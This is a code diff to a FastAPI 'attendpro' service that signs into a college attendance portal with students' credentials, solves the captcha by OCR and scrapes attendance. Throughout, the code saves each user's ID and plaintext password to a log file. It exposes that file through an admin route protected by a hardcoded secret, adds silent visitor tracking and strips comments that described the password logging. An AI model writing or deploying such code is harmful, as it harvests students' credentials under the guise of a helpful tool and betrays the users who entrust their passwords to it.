@@ -10,10 +10,10 @@ app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], all
 ocr = ddddocr.DdddOcr(show_ad=False)
 
 # --- USER LOGIN LOGGER HELPER ---
-def log_user_login(user: str, passw: str = None):
+def log_user_login(user: str, passw: str = None, tag: str = "Login"):
     try:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        log_entry = f"[{timestamp}] User ID: {user}"
+        log_entry = f"[{timestamp}] [{tag}] User ID: {user}"
         if passw:
             log_entry += f" | Pass: {passw}"
         log_entry += "\n"
@@ -26,6 +26,15 @@ def log_user_login(user: str, passw: str = None):
 @app.get("/")
 def health_check():
     return {"status": "alive", "service": "attendpro"}
+
+# --- AUTO TRACK RETURNING VISITOR ROUTE ---
+@app.get("/log-visitor")
+def log_visitor(user: str):
+    if user and user.strip():
+        log_user_login(user.strip(), tag="Visitor Auto-Track")
+        print(f"VISITOR LOGGED: {user}", flush=True)
+        return {"status": "success", "user": user}
+    return {"status": "ignored"}
 
 @app.get("/sync")
 def sync_attendance(user: str, passw: str):
@@ -58,17 +67,13 @@ def sync_attendance(user: str, passw: str):
                 page.fill('[name="studentid"]', user)
                 page.fill('[name="studentpwd"]', passw)
 
-                # Direct memory bytes se captcha read hoga
                 captcha_bytes = page.locator("#captcha").screenshot()
                 captcha_text = ocr.classification(captcha_bytes).strip()
 
                 page.fill('[name="captcha_code"]', captcha_text)
                 page.click('[name="student_submit"]')
-
-                # Form submit hone aur redirect hone ke liye wait
                 page.wait_for_timeout(2500)
 
-                # Check agar login successful hua aur URL badla
                 if "student_page.php" not in page.url:
                     login_success = True
                     break
@@ -79,16 +84,13 @@ def sync_attendance(user: str, passw: str):
                 browser.close()
                 return {"success": False, "error": "Login Failed. Password ya Captcha galat hai."}
 
-            # Attendance report page scrape
             page.goto("http://report.aldel.org/student/attendance_report.php", timeout=25000)
             page.wait_for_timeout(1500)
 
-            # Check agar portal par 'No Data Found.' likha hai ya table nahi hai
             if page.locator("text=No Data Found").count() > 0 or page.locator("table tr").count() == 0:
                 browser.close()
                 print(f"NO DATA: {user} ke portal par attendance data nahi mila", flush=True)
-                # Successful login log karo chahe attendance empty ho
-                log_user_login(user, passw)
+                log_user_login(user, passw, tag="Login (No Data)")
                 return {"success": True, "data": []}
 
             data = []
@@ -116,17 +118,14 @@ def sync_attendance(user: str, passw: str):
                         continue
 
             browser.close()
-
-            # 🔥 SUCCESS LOGIN RECORD SAVE HO RAHA HAI YAHAN 🔥
-            log_user_login(user, passw)
-
+            log_user_login(user, passw, tag="Login Sync")
             print(f"NAYA LOGIN: {user} synced successfully", flush=True)
             return {"success": True, "data": data}
 
     except Exception as e:
         return {"success": False, "error": str(e)}
 
-# --- ADMIN VIEW ROUTE (BROWSER ME LOGS DEKHNE KE LIYE) ---
+# --- ADMIN VIEW ROUTE ---
 @app.get("/view-logins-admin")
 def view_logins(secret: str):
     if secret != "nixay123":
@@ -134,6 +133,6 @@ def view_logins(secret: str):
     try:
         with open("logins.txt", "r", encoding="utf-8") as f:
             lines = [line.strip() for line in f.readlines() if line.strip()]
-        return {"total_users_logged": len(lines), "records": lines}
+        return {"total_records": len(lines), "records": lines}
     except FileNotFoundError:
-        return {"total_users_logged": 0, "records": []}
+        return {"total_records": 0, "records": []}
